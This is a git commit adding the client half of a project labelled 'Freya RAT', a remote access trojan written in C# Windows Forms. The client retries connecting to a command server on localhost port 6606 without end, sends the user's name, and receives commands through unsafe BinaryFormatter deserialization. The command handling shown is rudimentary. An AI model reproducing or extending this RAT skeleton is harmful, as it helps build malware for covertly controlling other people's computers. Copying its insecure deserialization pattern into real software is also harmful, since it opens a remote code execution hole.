7b39769fa07e06e2e61a3ea8cc83bd8a66fc8d37
Atalayagiz <78467521+Atalayagiz@users.noreply.github.com>
2022-11-15 19:55:36 +0300

    Add files via upload

---
+++ Freya RAT/RAT/Client/Client/Form1.Designer.cs
@@ -0,0 +1,74 @@
+﻿namespace Client
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///Gerekli tasarımcı değişkeni.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///Kullanılan tüm kaynakları temizleyin.
+        /// </summary>
+        ///<param name="disposing">yönetilen kaynaklar dispose edilmeliyse doğru; aksi halde yanlış.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer üretilen kod
+
+        /// <summary>
+        /// Tasarımcı desteği için gerekli metot - bu metodun 
+        ///içeriğini kod düzenleyici ile değiştirmeyin.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(561, 28);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(226, 61);
+            this.richTextBox1.TabIndex = 0;
+            this.richTextBox1.Text = "";
+            this.richTextBox1.TextChanged += new System.EventHandler(this.richTextBox1_TextChanged);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(561, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(62, 13);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Commands:";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.richTextBox1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.Label label1;
+    }
+}
+
---
+++ Freya RAT/RAT/Client/Client/Form1.cs
@@ -0,0 +1,263 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+//using System.Linq;
+using System.Net.Sockets;
+using System.Runtime.Serialization.Formatters.Binary;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+//using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Xml.Serialization;
+
+namespace Client
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        #region Variables
+        public TcpClient clientSocket;
+        public NetworkStream serverStream = default(NetworkStream);
+        string readData = null;
+        Thread ctThread;
+        string name = Environment.UserName;
+        List<string> nowChatting = new List<string>();
+        List<string> chat = new List<string>();
+        #endregion
+
+        #region Ineffectible variables
+
+        //Dictionary<string, Object> nowChatting = new Dictionary<string, Object>();
+
+        #endregion
+
+        //You can send commands from the server to the client with the following method.
+        #region Send Method
+        /*
+         try
+            {
+                if (!input.Text.Equals(""))
+                {
+                    chat.Add("gChat");
+                    chat.Add(input.Text);
+                    byte[] outStream = ObjectToByteArray(chat);
+
+                    serverStream.Write(outStream, 0, outStream.Length);
+                    serverStream.Flush();
+                    input.Text = "";
+                    chat.Clear();
+                }
+            }
+            catch (Exception er)
+            {
+                btnConnect.Enabled = true;
+            } 
+         */
+
+        #endregion
+
+        //If you don't know what you're doing, don't change it.
+        #region Setup
+
+        bool SocketConnected(TcpClient s) //check whether client is connected server
+        {
+            bool flag = false;
+            try
+            {
+                bool part1 = s.Client.Poll(10, SelectMode.SelectRead);
+                bool part2 = (s.Available == 0);
+                if (part1 && part2)
+                {
+                    this.Invoke((MethodInvoker)delegate // cross threads
+                    {
+
+                    });
+                    flag = false;
+                }
+                else
+                {
+                    flag = true;
+                }
+            }
+            catch (Exception er)
+            {
+                Console.WriteLine(er);
+            }
+            return flag;
+        }
+
+        public Object ByteArrayToObject(byte[] arrBytes)
+        {
+            using (var memStream = new MemoryStream())
+            {
+                var binForm = new BinaryFormatter();
+                memStream.Write(arrBytes, 0, arrBytes.Length);
+                memStream.Seek(0, SeekOrigin.Begin);
+                var obj = binForm.Deserialize(memStream);
+                return obj;
+            }
+        }
+
+        /*
+        public void getUsers(List<string> parts)
+        {
+            this.Invoke((MethodInvoker)delegate
+            {
+                listBox1.Items.Clear();
+                for (int i = 1; i < parts.Count; i++)
+                {
+                    listBox1.Items.Add(parts[i]);
+
+                }
+            });
+        }
+        */
+
+        private void getMessage()
+        {
+            try
+            {
+                while (true)
+                {
+                    serverStream = clientSocket.GetStream();
+                    byte[] inStream = new byte[10025];
+                    serverStream.Read(inStream, 0, inStream.Length);
+                    List<string> parts = null;
+
+                    if (!SocketConnected(clientSocket))
+                    {
+                        MessageBox.Show("You've been Disconnected");
+                        ctThread.Abort();
+                    }
+
+                    parts = (List<string>)ByteArrayToObject(inStream);
+                    switch (parts[0])
+                    {
+                        case "userList":
+                            //getUsers(parts);
+                            break;
+
+                        case "gChat":
+                            readData = "" + parts[1];
+                            msg();
+                            break;
+
+                        case "pChat":
+                            //managePrivateChat(parts);
+                            break;
+                    }
+
+                    if (readData[0].Equals('\0'))
+                    {
+                        readData = "Reconnect Again";
+                        msg();
+
+                        this.Invoke((MethodInvoker)delegate // To Write the Received data
+                        {
+
+                        });
+
+                        ctThread.Abort();
+                        clientSocket.Close();
+                        break;
+                    }
+                    chat.Clear();
+                }
+            }
+            catch (Exception e)
+            {
+                ctThread.Abort();
+                clientSocket.Close();
+                Console.WriteLine(e);
+            }
+
+        }
+
+        private void msg()
+        {
+            if (this.InvokeRequired)
+                this.Invoke(new MethodInvoker(msg));
+            else
+                richTextBox1.Text = readData;
+        }
+
+        /*
+        public void managePrivateChat(List<string> parts)
+        {
+
+            this.Invoke((MethodInvoker)delegate // To Write the Received data
+            {
+                if (parts[3].Equals("new"))
+                {
+                    formPrivate privateC = new formPrivate(parts[2], clientSocket, name);
+                    nowChatting.Add(parts[2]);
+                    privateC.Text = "Private Chat with " + parts[2];
+                    privateC.Show();
+                }
+                else
+                {
+                    if (Application.OpenForms["formPrivate"] != null)
+                    {
+                        (Application.OpenForms["formPrivate"] as formPrivate).setHistory(parts[3]);
+                    }
+                }
+
+            });
+
+        }
+        */
+
+        #endregion
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+        
+        #region Connection setup
+        bas:
+            clientSocket = new TcpClient();
+            try
+            {
+                clientSocket.Connect("127.0.0.1", 6606);
+                readData = "Connected to Server ";
+                msg();
+
+                serverStream = clientSocket.GetStream();
+
+                byte[] outStream = Encoding.ASCII.GetBytes(name + "$");
+                serverStream.Write(outStream, 0, outStream.Length);
+                serverStream.Flush();
+
+                ctThread = new Thread(getMessage);
+                ctThread.Start();
+            }
+
+            catch (Exception ex)
+            {
+                goto bas;
+            }
+
+            #endregion
+
+
+        }
+
+        private void richTextBox1_TextChanged(object sender, EventArgs e)
+        {
+            if (richTextBox1.Text.Contains("MSGBOX"))
+            {
+                MessageBox.Show("Test Message");
+            }
+        }
+    }
+}
